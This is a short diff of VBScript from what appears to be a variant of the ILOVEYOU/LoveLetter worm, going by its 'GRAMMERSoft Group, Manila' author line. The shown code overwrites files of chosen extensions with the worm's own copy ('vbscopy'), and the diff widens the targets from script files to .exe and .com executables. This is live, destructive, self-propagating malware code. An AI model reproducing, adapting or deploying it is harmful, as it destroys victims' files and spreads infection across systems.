@@ -90,7 +90,7 @@ rem by: master7720  /  master7720@mail.com  /  @GRAMMERSoft Group  /  Manila,Phi
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
- elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
+ elseif(ext="exe") or (ext="com") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
